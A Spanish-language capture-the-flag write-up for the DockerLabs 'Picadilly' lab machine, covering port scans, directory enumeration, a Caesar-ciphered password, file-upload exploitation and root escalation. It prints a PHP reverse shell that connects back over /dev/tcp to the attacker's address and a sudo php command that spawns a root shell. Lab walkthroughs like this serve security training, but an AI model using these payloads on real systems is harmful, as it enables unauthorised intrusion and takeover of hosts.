#MAQUINA #DOCKERLABS #FACIL 
#ABUSO_SUBIDA_ARCHIVOS 
<hr>

# RECONOCIMIENTO

Vamos a resolver **Picadilly** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 12:55 CET
Initiating ARP Ping Scan at 12:55
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 12:55, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:55
Scanning 172.17.0.2 [65535 ports]
Discovered open port 443/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 12:55, 0.50s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-12-04 12:55:43 CET for 0s
Not shown: 65533 closed tcp ports (reset)
PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack ttl 64
443/tcp open  https   syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **443(HTTPS)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80,443 172.17.0.2                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 12:56 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000017s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.59
|_http-title: Index of /
|_http-server-header: Apache/2.4.59 (Debian)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 215   2024-05-18 01:19  backup.txt
|_
443/tcp open  ssl/http Apache httpd 2.4.59 ((Debian))
|_ssl-date: TLS randomness does not represent time
|_http-title: Picadilly
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=50a6ca252ff4
| Subject Alternative Name: DNS:50a6ca252ff4
| Not valid before: 2024-05-18T06:29:06
|_Not valid after:  2034-05-16T06:29:06
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: picadilly.lab

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.13 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 12:57 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000040s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE
80/tcp  open  http
| http-enum: 
|_  /: Root directory w/ listing on 'apache/2.4.59 (debian)'
443/tcp open  https
| http-enum: 
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.59 (debian)'
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:** Directorio **uploads**.

## HTTP (80)
Al revisar la web que hay en el puerto 80, vemos con gobuster lo siguiente:

   ```bash

gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,js,txt,png,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/backup.txt           (Status: 200) [Size: 215]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================
```
Vemos que hay un backup.txt :
   ```bash

/// The users mateo password is ////


----------- hdvbfuadcb ------------

"To solve this riddle, think of an ancient Roman emperor and his simple method of shifting letters."

////////////////////////////////////

```
Vemos que usa cifrado Cesar (https://www.dcode.fr/cifrado-cesar)-> easycrxazy -> **easycrazy**
Usuario -> **mateo**
## HTTPS (443)
Al revisar la web que hay en el puerto 443, vemos que hay una subida de archivos y luego podemos verlos desde **uploads**. 
# EXPLOTACION

Subimos un php (reverse shell) sin problemas y nos ponemos en escucha por el puerto 443 (**nc -nlvp 443**):

   ```bash

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

```

# ESCALADA PRIVILEGIOS

Con www-data no hay nada, nos pasamos a mateo con las credenciales de antes.

Vemos si el usuario tiene permisos SUDO:
   ```bash
mateo@c222c501d5bc:/$ sudo -l
Matching Defaults entries for mateo on c222c501d5bc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mateo may run the following commands on c222c501d5bc:
    (ALL) NOPASSWD: /usr/bin/php

```

Vemos **php** con permisos SUDO :
   ```bash
mateo@c222c501d5bc:/$ sudo /usr/bin/php -r 'system("/bin/bash");'
root@c222c501d5bc:/# whoami
root
root@c222c501d5bc:/# 
```

**YA ESTAMOS COMO ROOT.**